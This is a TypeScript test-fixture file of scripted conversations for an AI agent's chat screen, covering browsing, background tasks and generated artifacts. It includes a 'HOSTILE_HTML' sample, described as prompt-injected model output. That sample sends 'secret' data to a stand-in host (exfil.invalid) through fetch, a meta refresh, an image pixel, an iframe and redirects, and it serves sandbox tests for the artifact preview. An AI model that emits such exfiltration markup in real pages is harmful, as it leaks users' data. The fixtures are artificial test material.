import { crc32, deflateSync } from "node:zlib"
import type { RunnerMessage, RunnerSnapshot } from "@openwork-ee/headless-protocol"

/**
 * Test-only conversations for chat-screen-server.ts, in the shape `GET /v1/workbot` answers. Each scenario is a
 * function so every server start begins from the same conversation.
 */
type Part = { kind: "text"; text: string; step?: number } | { kind: "steps"; steps: unknown[] }
export type FixtureTurn = {
  id: string
  text: string
  sentAt: number | null
  finishedAt: number | null
  status: "queued" | "working" | "done" | "failed" | "stopped"
  attachments: Array<{ id: string; name: string; mediaType: string; size: number }>
  parts: Part[]
  modelSteps: number
  error: string | null
  tasks?: unknown[]
  greeting?: boolean
  retryable?: boolean
  outputs?: Array<{ id: string; name: string; mediaType: string; size: number; updatedAt?: number }>
}
export type FixtureThread = { name: string; organizationName: string; status: "idle" | "busy"; turns: FixtureTurn[]; hasEarlier: boolean; filesEnabled: boolean }

const minutesAgo = (minutes: number) => Date.now() - minutes * 60_000
const said = (text: string, step = 0): Part => ({ kind: "text", text, step })
export const turn = (id: string, text: string, at: number, parts: Part[], extra: Partial<FixtureTurn> = {}): FixtureTurn =>
  ({ id, text, sentAt: at, finishedAt: at + 2_000, status: "done", attachments: [], parts, modelSteps: parts.length, error: null, ...extra })
export const hello = (): FixtureTurn => turn("hello", "", minutesAgo(30), [said("Hey Sam, happy Saturday. What can I do for you?")], { greeting: true })

const ago = (seconds: number) => Date.now() - seconds * 1_000
const appStep = (label: string, app: string, running: boolean, at: number) => ({ label, icon: "app", status: running ? "running" : "done", app, startedAt: at, finishedAt: running ? null : at + 2_000, updates: [] })
const computerStep = (updates: string[], running: boolean, at: number, extra: Record<string, unknown> = {}) =>
  ({ label: "Using the browser", icon: "computer", status: running ? "running" : "done", app: null, startedAt: at, finishedAt: running ? null : at + 5_000, updates, ...extra })
const working = (turnValue: FixtureTurn): FixtureTurn => ({ ...turnValue, status: "working", finishedAt: null })

export const scenarios: Record<string, () => FixtureThread> = {
  remote: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("remote-parent", "Check the browser changes on my Mac Studio", ago(400), [said("The checks are running on your Mac Studio. I'll reply here with the result.")], {
      tasks: [
        { id: "remote-parent.t1", title: "Watch the remote session", status: "working", startedAt: ago(300), finishedAt: null, update: null, updates: [], steps: [], stepsDone: 0, note: null },
        { id: "remote-parent.t2", title: "3D room planner", status: "stopped", startedAt: ago(13_000), finishedAt: ago(12_000), update: null, updates: [], steps: [], stepsDone: 0, note: null },
      ],
    })],
  }),
  /** Accepted, deliberately slow first token: the acknowledgement must not depend on a model response. */
  waiting: () => ({ name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [hello(), working(turn("w1", "Use the browser to open YouTube", Date.now(), [], { modelSteps: 0 }))],
  }),
  /** Hours-old stopped job must never hold the header or offer Stop. */
  stopped: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("s1", "Build a 3D room planner", ago(13_000), [said("I stopped the room planner.")], {
      tasks: [{ id: "s1.t1", title: "3D room planner", status: "stopped", startedAt: ago(13_000), finishedAt: ago(12_000), update: null, updates: [], steps: [], stepsDone: 0, note: null }],
    })],
  }),
  /** #6: Workbot searching YouTube in its browser, without showing its screen. */
  browsing: () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      working(turn("b1", "Find Chris Young's salmon tips, he has a thermometer", ago(70), [
        said("On it: I'll look through Chris Young's videos for his salmon advice and the thermometer he uses, and send you the best two with timestamps. A couple of minutes."),
        { kind: "steps", steps: [appStep("Searching Slack", "Slack", false, ago(65)), computerStep(["Opening youtube.com/results", "Searching YouTube"], true, ago(55), { surface: "browser" })] },
      ], { modelSteps: 2 })),
    ],
  }),
  /** Work on the rest of Workbot's computer (not its browser): a finished Computer card, then one still working. */
  "computer-use": () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("c1", "Open Blender on the computer for me", ago(600), [
        said("Sure, opening Blender on the computer now."),
        { kind: "steps", steps: [{ ...computerStep(["Opening Blender", "Waiting for Blender to finish loading"], false, ago(590)), label: "Using my computer", shown: true }] },
      ], { modelSteps: 2 }),
      working(turn("c2", "Draw a lake around the duck, by hand in the menus", ago(40), [
        said("Got it, no shortcuts this time. I'll do it by hand in Blender's menus so you can watch."),
        { kind: "steps", steps: [{ ...computerStep(["Adding a cylinder", "Flattening the lake and setting it level"], true, ago(30)), label: "Using my computer", shown: true }] },
      ], { modelSteps: 2 })),
    ],
  }),
  /** Deterministic running task for preview ownership/control proofs; no external identity. */
  "browser-lifecycle": () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [hello(), working(turn("browser_live", "Open the project page in your browser", ago(10), [
      said("I'll open the project page in my browser."),
      { kind: "steps", steps: [computerStep(["Opening the project page"], true, ago(5), { surface: "browser" })] },
    ], { modelSteps: 2 }))],
  }),
  /** #9 and #10: a background task building an app, then a quick command on the computer. */
  task: () => ({
    name: "Workbot", organizationName: "Example Team", status: "busy", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("t1", "Code me an app that canothanize my Space in 3d", ago(140), [said("Fun one. I'll build you a 3D room planner.")], {
        tasks: [{ id: "t1.t1", title: "3D room planner", status: "working", startedAt: ago(135), finishedAt: null, update: "Building the planner", updates: ["Setting up the project", "Building the planner"],
          steps: [{ label: "Searching Google Drive", done: true, at: ago(130) }, { label: "Setting up the project", done: true, at: ago(110) }, { label: "Building the planner", done: false, at: ago(40) }], stepsDone: 2, note: "Planning the layout first: walls, then furniture you can drag." }],
      }),
      working(turn("t2", "This looks very ugly I also hate the way you show you're working on your computer", ago(20), [
        { kind: "steps", steps: [{ label: "Working on my computer", icon: "computer", status: "running", app: null, startedAt: ago(15), finishedAt: null, updates: ["Opening your screenshot"], background: true }] },
      ], { modelSteps: 1 })),
    ],
  }),
  /** Nov 8: "Could you go on google.com with browser", as the conversation is read once it is done (see googleAt). */
  google: () => googleAt(2),
  exa: () => exaAt(3),
  openwork: () => openworkAt(false),
  "openwork-live": () => openworkAt(true),
  connectors: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("stack", "Find the UX research, check our design notes, and put the next steps in Linear.", minutesAgo(1), [
      said("I checked the research and your team's notes. The next steps are in Linear."),
      { kind: "steps", steps: ["Exa", "Exa", "Google Drive", "Linear", "Slack", "GitHub", "PlanetScale", "Research"].map((app) => ({ ...appStep(`Checking ${app}`, app, false, ago(20)), detail: "Read notes" })) },
    ])],
  }),
  /** Files Workbot made: an interactive app (a live thumbnail), then a report and a spreadsheet (placeholders by type). */
  artifacts: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("a1", "Code me an app that organizes my space in 3D", minutesAgo(8), [said("Here's your 3D space organizer. Drag the boxes to plan the room; the shelf list on the right updates as you go.")], {
        outputs: [ARTIFACT_FILES.organizer],
      }),
      turn("a2", "Can you also write up the plan and the shopping list?", minutesAgo(3), [said("Done: the plan is in the report and the shopping list is a spreadsheet.")], {
        outputs: [ARTIFACT_FILES.report, ARTIFACT_FILES.shopping],
      }),
    ],
  }),
  /** An artifact built in OpenWork and an HTML file in the same reply. */
  "openwork-app": () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("o1", "Create a simple hello world artifact", minutesAgo(2), [said("Hello World Wave is ready. Open the artifact from the card below.")], { outputs: [OPENWORK_APP, ARTIFACT_FILES.organizer] })],
  }),
  /** A tall phone screenshot Workbot sends back: its card and preview keep the picture's proportions. */
  photo: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("p1", "Send me the screenshot of the phone app", minutesAgo(1), [said("Here it is, straight from the phone build.")], { outputs: [ARTIFACT_FILES.photo] })],
  }),
  /** An app that tries to reach the network and navigate by itself: its card must do neither until it is opened. */
  "artifact-hostile": () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [hello(), turn("h1", "Summarize my inbox as a page", minutesAgo(2), [said("Here's the summary page.")], { outputs: [ARTIFACT_FILES.hostile] })],
  }),
  /**
   * ENG-1143, production Nov 9: nothing running, and background tasks that each polled a remote task many times (the
   * same "Checking the remote task" step over and over), two of them gone quiet. Each must stay one row.
   */
  background: () => {
    const polls = (count: number, firstAgo: number, gap: number) => Array.from({ length: count }, (_, index) => ({ label: "Checking the remote task", done: true, at: ago(firstAgo - index * gap) }))
    const task = (id: string, title: string, status: string, startedAgo: number, steps: Array<{ label: string; done: boolean; at: number }>, finishedAgo: number | null = null) =>
      ({ id, title, status, startedAt: ago(startedAgo), finishedAt: finishedAgo === null ? null : ago(finishedAgo), update: null, updates: steps.map((step) => step.label), steps, stepsDone: steps.filter((step) => step.done).length, note: null })
    return { name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
      turns: [hello(), turn("bg1", "Keep an eye on the browser fix on my Mac Studio and tell me when it's merged", ago(9_000), [said("I'm watching it and will tell you here when it's merged.")], {
        tasks: [
          task("bg1.t1", "Watch the browser fix on the Mac Studio", "working", 8_900, polls(7, 8_800, 120)),
          task("bg1.t2", "Watch the release checks", "working", 8_000, polls(5, 7_900, 180)),
          task("bg1.t3", "Draft the release notes", "done", 7_000, [{ label: "Reading the merged changes", done: true, at: ago(6_900) }, ...polls(3, 6_800, 60), { label: "Writing the notes", done: true, at: ago(6_500) }], 6_400),
          task("bg1.t4", "3D room planner", "stopped", 13_000, [], 12_000),
        ],
      })],
    }
  },
  /** Short and long messages from the person (#1, #2): "Hey" must stay on one line. */
  /** A conversation with nothing in it yet: the first-open screen. */
  empty: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true, turns: [] }),
  /** A turn that failed: the error line under the request, with Try again. */
  failed: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("f0", "What's on my calendar tomorrow?", minutesAgo(9), [said("Two things: a planning review at 10 and a dentist appointment at 4.")]),
      turn("f1", "Move the planning review to Thursday", minutesAgo(2), [], { status: "failed", modelSteps: 0, retryable: true, error: "Workbot could not finish this. Try again in a moment." }),
    ],
  }),
  /** Long messages both ways: wrapping, lists and paragraphs in the narrow column. */
  long: () => ({ name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("l1", "I'm planning a two-day offsite for twelve people next month. We need a venue within an hour of the office, one big room and two breakout rooms, lunch both days, and I'd like to keep it under budget without it feeling cheap. Can you sketch a plan and tell me what you need from me?", minutesAgo(7), [said([
        "Here's a first plan for the offsite. It keeps both days short enough that people still have energy on the second afternoon.",
        "**Day one**\n\n- 9:30 arrive, coffee, and a short opening on what the two days are for\n- 10:00 to 12:30 the big-room session on next quarter's goals\n- Lunch on site, then breakouts in two groups until 4:00\n- 4:00 to 5:00 each group shares back, followed by dinner nearby",
        "**Day two**\n\n- 9:30 to 11:30 decisions: what we commit to and who owns it\n- 11:30 to 12:30 open time for anything that came up overnight\n- Lunch, then a one-hour wrap-up so everyone leaves by 2:30",
        "To book it I need three things from you: the two dates you prefer, a rough budget per person, and whether anyone has dietary or access needs. Once I have those I'll shortlist three venues with prices and availability.",
      ].join("\n\n"))]),
      turn("l2", "Dates are the 14th and 15th, no access needs that I know of.", minutesAgo(3), [said("Got it. I'll look for venues free on the 14th and 15th and come back with three options, each with the room layout, lunch and total price.")]),
    ],
  }),
  bubbles: () => ({
    name: "Workbot", organizationName: "Example Team", status: "idle", hasEarlier: false, filesEnabled: true,
    turns: [
      hello(),
      turn("m1", "Hey", minutesAgo(6), [said("Hey! What's up?")]),
      turn("m2", "ok", minutesAgo(5), [said("👍")]),
      turn("m3", "Los notifs on the same image how the bubble seems a bit cut", minutesAgo(4), [said("Added as #2, using the same screenshot.")]),
    ],
  }),
}

/**
 * Ben's request of Nov 8 at each point the page reads it: 0, the call is being written and nothing is stored yet (the
 * live `working` events in GOOGLE_EVENTS are all the page has); 1, the browser call is stored and running; 2, done.
 */
export function googleAt(phase: 0 | 1 | 2): FixtureThread {
  const sent = Date.now() - 6_000
  const step = computerStep(["Opening google.com"], phase === 1, sent + 1_000, { surface: "browser", pages: [{ id: "g00gle", url: "https://www.google.com/", title: "google.com" }] })
  const parts: Part[] = phase === 0 ? [] : phase === 1 ? [{ kind: "steps", steps: [step] }] : [{ kind: "steps", steps: [step] }, said("Done: google.com is open in my browser.", 1)]
  const asked = turn("g1", "Could you go on google.com with browser", sent, parts, { modelSteps: phase === 0 ? 0 : phase === 1 ? 1 : 2 })
  return { name: "Workbot", organizationName: "Example Team", status: phase === 2 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 2 ? asked : working(asked)] }
}

/**
 * Ben's request of Nov 8 at 7:33 ("could you use exa to search about best ux practices and skills"), in the shape
 * workbot-server builds from the runner's transcript for `mcp:<connection>:web_search_exa` calls: 0, the first search
 * is running; 1, the second; 2, both done while Workbot reads the results; 3, answered (also what a reload reads).
 */
export function exaAt(phase: 0 | 1 | 2 | 3): FixtureThread {
  const sent = Date.now() - 12_000
  const search = (running: boolean, at: number) => ({ ...appStep("Searching Exa", "Exa", running, at), detail: "Web search", site: "exa.ai" })
  const steps = phase === 0 ? [search(true, sent + 1_000)] : [search(false, sent + 1_000), search(phase === 1, sent + 4_000)]
  const parts: Part[] = [said("I'll search Exa for best UX practices and skills, then I'll come back with the useful bits."), { kind: "steps", steps }]
  if (phase === 3) parts.push(said("Here's what stands out: keep feedback immediate, show system status, and make every action reversible.", 2))
  const asked = turn("x1", "could you use exa to search about best ux practices and skills", sent, parts, { modelSteps: phase === 0 ? 1 : phase === 3 ? 3 : 2 })
  return { name: "Workbot", organizationName: "Example Team", status: phase === 3 ? "idle" : "busy", hasEarlier: false, filesEnabled: true, turns: [hello(), phase === 3 ? asked : working(asked)] }
}

/**
 * One answer that used connectors and OpenWork's own features, as the runner stores it: Exa, Google Drive, Linear,
 * then a skill, a plugin Workflow, an Automation, a background task and a remote task on the person's Mac Studio.
 * `live` leaves the remote task running. connector-steps.test.ts checks openworkAt against workbot-server's real
 * buildWorkbotTurns of this transcript (the fixture server runs without the development build of workbot-server).
 */
export function openworkSnapshot(live: boolean, sent: number): RunnerSnapshot {
  const id = "wb_ow1"
  const messages: RunnerMessage[] = [{ messageId: id, role: "user", text: OPENWORK_REQUEST }]
  OPENWORK_CALLS.forEach(([callId, name, input], index) => {
    const at = sent + 1_000 + index * 2_000
    messages.push({ messageId: id, role: "assistant", text: index === 0 ? "On it. I'll pull this together and set it up." : "", createdAt: at, toolCalls: [{ id: callId, name, input }] })
    if (!(live && callId === "c8")) messages.push({ messageId: id, role: "tool", callId, name, isError: false, createdAt: at + 500 })
  })
  if (!live) messages.push({ messageId: id, role: "assistant", text: OPENWORK_ANSWER, createdAt: sent + 20_000, toolCalls: [] })
  return {
    status: live ? "busy" : "idle", finalAssistantText: "", hasEarlier: false, messages,
    turns: [{ messageId: id, status: live ? "running" : "completed", createdAt: sent, updatedAt: sent + 21_000, error: null }],
  }
}
export const OPENWORK_CONNECTORS = new Map([["emc_01kexa7q2m", { name: "Exa", site: "exa.ai" }], ["emc_01klin42aa", { name: "Linear", site: "linear.app" }]])
const OPENWORK_REQUEST = "Make my weekly digest: research the format, use my notes and Linear, run it on my Mac Studio and schedule it."
const OPENWORK_ANSWER = "Done. Your weekly digest runs every Monday at 9, and the first draft is on its way from your Mac Studio."
const OPENWORK_CALLS: Array<[string, string, Record<string, unknown>]> = [
  ["c1", "execute_capability", { name: "mcp:emc_01kexa7q2m:web_search_exa", body: { query: "weekly digest format" } }],
  ["c2", "execute_capability", { name: "native:google-workspace:searchGoogleDriveFiles", query: { q: "digest" } }],
  ["c3", "execute_capability", { name: "mcp:emc_01klin42aa:list_issues", body: {} }],
  ["c4", "get_skill", { name: "weekly-digest-ksdx8c7f" }],
  ["c5", "execute_capability", { name: "plugin:plg_01k9:cfg_01k9", body: {} }],
  ["c6", "execute_capability", { name: "createCloudAutomation", body: { title: "Weekly digest" } }],
  ["c7", "start_task", { title: "Draft the weekly digest", brief: "…" }],
  ["c8", "execute_capability", { name: "remote-session:create", body: { target: "mac-studio" } }],
]
/** The steps workbot-server builds from OPENWORK_CALLS, in order (checked by connector-steps.test.ts). */
const OPENWORK_STEPS: Array<Record<string, unknown>> = [
  { label: "Searching Exa", app: "Exa", detail: "Web search", site: "exa.ai" },
  { label: "Searching Google Drive", app: "Google Drive", detail: "Search drive files" },
  { label: "Checking Linear", app: "Linear", detail: "List issues", site: "linear.app" },
  { label: "Reading a skill", app: "OpenWork", detail: "Weekly digest", site: "openworklabs.com", openwork: true },
  { label: "Using OpenWork", app: "OpenWork", detail: "Workflow or skill", site: "openworklabs.com", openwork: true },
  { label: "Setting up an automation", app: "OpenWork", detail: "Automations", site: "openworklabs.com", openwork: true },
  { label: "Starting a background task", app: "OpenWork", detail: "Draft the weekly digest", site: "openworklabs.com", openwork: true },
  { label: "Starting a remote task", app: "OpenWork", detail: "Remote task", site: "openworklabs.com", openwork: true, remote: true },
]

/** The page's view of openworkSnapshot: (Exa)(Google Drive)(Linear)(OpenWork), one OpenWork logo for all its features. */
export function openworkAt(live: boolean, sent = Date.now() - 30_000): FixtureThread {
  const parts: Part[] = []
  OPENWORK_STEPS.forEach((step, index) => {
    const at = sent + 1_000 + index * 2_000
    const running = live && index === OPENWORK_STEPS.length - 1
    if (index === 0) parts.push(said("On it. I'll pull this together and set it up.", 0))
    const value = { ...step, icon: "app", status: running ? "running" : "done", startedAt: at, finishedAt: running ? null : at + 500, updates: [] }
    const last = parts.at(-1)
    if (last?.kind === "steps") last.steps.push(value)
    else parts.push({ kind: "steps", steps: [value] })
  })
  if (!live) parts.push(said(OPENWORK_ANSWER, OPENWORK_STEPS.length))
  const asked = turn("wb_ow1", OPENWORK_REQUEST, sent, parts, { modelSteps: OPENWORK_STEPS.length + (live ? 0 : 1), finishedAt: live ? null : sent + 21_000 })
  return { name: "Workbot", organizationName: "Example Team", status: live ? "busy" : "idle", hasEarlier: false, filesEnabled: true, turns: [hello(), live ? working(asked) : asked] }
}

/** What the page hears while the call is written, as workbot-server sends it: the start, then where, then what. */
export const GOOGLE_EVENTS = [
  { type: "working", messageId: "g1", step: 0, on: "computer" },
  { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser" },
  { type: "working", messageId: "g1", step: 0, on: "computer", surface: "browser", update: "Opening google.com" },
]

/** A small interactive app, as Workbot writes one: its <title> names the card. */
const ORGANIZER_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>3D Space Organizer</title>
<style>
body{margin:0;font:13px/1.4 system-ui,sans-serif;background:linear-gradient(180deg,#eef3f8,#dfe8f1);color:#11181c;height:100vh;display:flex}
main{flex:1;display:grid;place-items:center;perspective:1200px}
.room{width:420px;height:300px;position:relative;transform:rotateX(58deg) rotateZ(-38deg);transform-style:preserve-3d;background:#fdfdfd;box-shadow:0 30px 60px -20px #01162744;border-radius:6px;
  background-image:linear-gradient(#0116270f 1px,transparent 1px),linear-gradient(90deg,#0116270f 1px,transparent 1px);background-size:30px 30px}
.box{position:absolute;transform-style:preserve-3d;cursor:grab;border-radius:3px}
.box::before{content:"";position:absolute;inset:0;transform:translateZ(var(--h));background:inherit;filter:brightness(1.08);border-radius:3px}
aside{width:220px;background:#fff;border-left:1px solid #0116270f;padding:20px}
h1{font-size:15px;margin:0 0 12px}li{display:flex;gap:8px;align-items:center;padding:6px 0;border-bottom:1px solid #0116270d}
i{width:10px;height:10px;border-radius:3px;display:inline-block}ul{list-style:none;margin:0;padding:0}
@media(max-width:700px){body{flex-direction:column}.room{width:300px;height:220px}aside{width:auto;border-left:0;border-top:1px solid #0116270f}}
</style></head><body><main><div class="room" id="room"><div class="box" style="left:20px;top:20px;width:60px;height:180px;background:#5b8def;--h:80px"></div><div class="box" style="left:120px;top:30px;width:150px;height:70px;background:#f0a35e;--h:40px"></div><div class="box" style="left:300px;top:40px;width:80px;height:80px;background:#4fb38a;--h:50px"></div><div class="box" style="left:130px;top:200px;width:170px;height:70px;background:#a78bdb;--h:30px"></div><div class="box" style="left:340px;top:220px;width:40px;height:40px;background:#7cc36b;--h:60px"></div></div></main>
<aside><h1>Shelves and storage</h1><ul>
<li><i style="background:#5b8def"></i>Bookshelf</li><li><i style="background:#f0a35e"></i>Desk</li><li><i style="background:#4fb38a"></i>Storage bins</li><li><i style="background:#a78bdb"></i>Sofa</li><li><i style="background:#7cc36b"></i>Plant</li></ul></aside>
<script>
for(const b of document.querySelectorAll(".box"))b.onpointerdown=e=>{b.setPointerCapture(e.pointerId);const sx=e.clientX,sy=e.clientY,ox=b.offsetLeft,oy=b.offsetTop;b.onpointermove=m=>{b.style.left=ox+(m.clientX-sx)+"px";b.style.top=oy+(m.clientY-sy)+"px"};b.onpointerup=()=>{b.onpointermove=null}}
</script></body></html>`

/** Model-written HTML that tries to send what it holds elsewhere the moment it renders (prompt injection). */
const HOSTILE_HTML = `<!doctype html><html><head><title>Inbox summary</title><meta http-equiv="refresh" content="0;url=http://exfil.invalid/refresh?d=secret">
<link rel="stylesheet" href="http://exfil.invalid/style.css"><style>@import url(http://exfil.invalid/import.css);body{font:14px system-ui;padding:24px}</style></head>
<body onload="fetch('http://exfil.invalid/onload?d=secret')"><h1>Inbox summary</h1><p>Three threads need a reply today: the vendor invoice, the offsite plan and the hiring loop.</p>
<img src="http://exfil.invalid/pixel.png?d=secret" alt=""><iframe src="http://exfil.invalid/frame"></iframe>
<script>fetch("http://exfil.invalid/script?d=secret");location.href="http://exfil.invalid/navigate?d=secret"</script></body></html>`

const SHOPPING_CSV = "Item,Where,Price\nWall shelf (120cm),Furniture store,49\nStorage bins x4,Home store,36\nDesk lamp,Lighting shop,29\nPlant stand,Furniture store,19\n"

/**
 * A tall phone screenshot (390 × 844 at 2x) as a PNG: a status bar, a notification card and rows. Its preview must keep
 * these proportions inside the panel instead of rendering at its own size.
 */
function phoneScreenshot(): Buffer {
  const width = 390, height = 844
  const rows: Buffer[] = []
  for (let y = 0; y < height; y++) {
    const row = Buffer.alloc(1 + width * 3)
    for (let x = 0; x < width; x++) {
      const card = y > 70 && y < 190 && x > 16 && x < width - 16
      const line = y > 260 && (y - 260) % 80 < 56 && x > 24 && x < width - 24
      const bar = y < 48
      const [r, g, b] = bar ? [233, 237, 240] : card ? [255, 255, 255] : line ? [238, 242, 245] : [246, 248, 249]
      const icon = card && x > 32 && x < 84 && y > 92 && y < 144
      row.set(icon ? [37, 137, 237] : [r, g, b], 1 + x * 3)
    }
    rows.push(row)
  }
  const chunk = (type: string, data: Buffer) => {
    const head = Buffer.alloc(8); head.writeUInt32BE(data.length, 0); head.write(type, 4, "ascii")
    const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(Buffer.concat([Buffer.from(type, "ascii"), data])) >>> 0, 0)
    return Buffer.concat([head, data, crc])
  }
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(width, 0); ihdr.writeUInt32BE(height, 4); ihdr[8] = 8; ihdr[9] = 2
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk("IHDR", ihdr), chunk("IDAT", deflateSync(Buffer.concat(rows))), chunk("IEND", Buffer.alloc(0))])
}
const PHONE_PNG = phoneScreenshot()

/** Bytes for the files the "artifacts" scenario made, served at /v1/workbot/files/:id. */
export const ARTIFACT_BYTES: Record<string, { mediaType: string; bytes: string | Buffer }> = {
  "out-photo": { mediaType: "image/png", bytes: PHONE_PNG },
  "out-organizer": { mediaType: "text/html", bytes: ORGANIZER_HTML },
  "out-hostile": { mediaType: "text/html", bytes: HOSTILE_HTML },
  "out-report": { mediaType: "application/pdf", bytes: "%PDF-1.4\n% fixture\n" },
  "out-shopping": { mediaType: "text/csv", bytes: SHOPPING_CSV },
}
/** An App built in OpenWork as a reply lists it: no bytes, its title as its name. */
export const OPENWORK_APP_ID = "cob_01kq8z0000000000000000000a"
const OPENWORK_APP = { id: `app:${OPENWORK_APP_ID}`, name: "Hello World Wave", mediaType: "application/vnd.openwork.app", size: 0, updatedAt: 1 }
/**
 * What opening that App answers: a page that speaks the MCP Apps protocol to its host (initialize, then the opening
 * result), and calls its own `wave` tool from a button.
 */
export const OPENWORK_APP_OPENED = {
  result: { content: [{ type: "text", text: "Hello World Wave" }], structuredContent: { app: { appId: OPENWORK_APP_ID, title: "Hello World Wave" }, greeting: "Hello, World!" } },
  html: `<!doctype html><html><head><meta charset="utf-8"><title>Hello World Wave</title><style>
body{margin:0;min-height:100vh;display:grid;place-items:center;font:16px system-ui;background:#f6f8f9;color:#11181c}
main{display:grid;gap:12px;justify-items:center}h1{margin:0;font-size:28px}
button{font:inherit;padding:8px 16px;border-radius:999px;border:0;background:#011627;color:#eef2f6}
</style></head><body><main><h1 id="greeting">Waiting for the host</h1><p id="count">No waves yet</p><button id="wave" type="button">Wave back</button></main><script>
let next = 1; const waiting = new Map()
const ask = (method, params) => new Promise((resolve, reject) => { const id = next++; waiting.set(id, { resolve, reject }); parent.postMessage({ jsonrpc: "2.0", id, method, params }, "*") })
addEventListener("message", (event) => {
  const message = event.data
  if (!message || message.jsonrpc !== "2.0") return
  if (message.method === "ui/notifications/tool-result") document.getElementById("greeting").textContent = message.params.structuredContent.greeting
  const pending = waiting.get(message.id)
  if (!pending) return
  waiting.delete(message.id)
  if (message.error) pending.reject(new Error(message.error.message)); else pending.resolve(message.result)
})
ask("ui/initialize", { protocolVersion: "2026-01-26" }).then(() => parent.postMessage({ jsonrpc: "2.0", method: "ui/notifications/initialized" }, "*"))
document.getElementById("wave").addEventListener("click", async () => {
  const result = await ask("tools/call", { name: "wave", arguments: {} }).catch((error) => ({ structuredContent: { waves: error.message } }))
  document.getElementById("count").textContent = "Waves: " + result.structuredContent.waves
})
</script></body></html>`,
}
const ARTIFACT_FILES = {
  organizer: { id: "out-organizer", name: "space-organizer.html", mediaType: "text/html", size: ORGANIZER_HTML.length, updatedAt: 1 },
  hostile: { id: "out-hostile", name: "inbox-summary.html", mediaType: "text/html", size: HOSTILE_HTML.length, updatedAt: 1 },
  report: { id: "out-report", name: "Room plan.pdf", mediaType: "application/pdf", size: 48_211, updatedAt: 1 },
  shopping: { id: "out-shopping", name: "Shopping list.csv", mediaType: "text/csv", size: SHOPPING_CSV.length, updatedAt: 1 },
  photo: { id: "out-photo", name: "IMG_7186.png", mediaType: "image/png", size: PHONE_PNG.length, updatedAt: 1 },
}
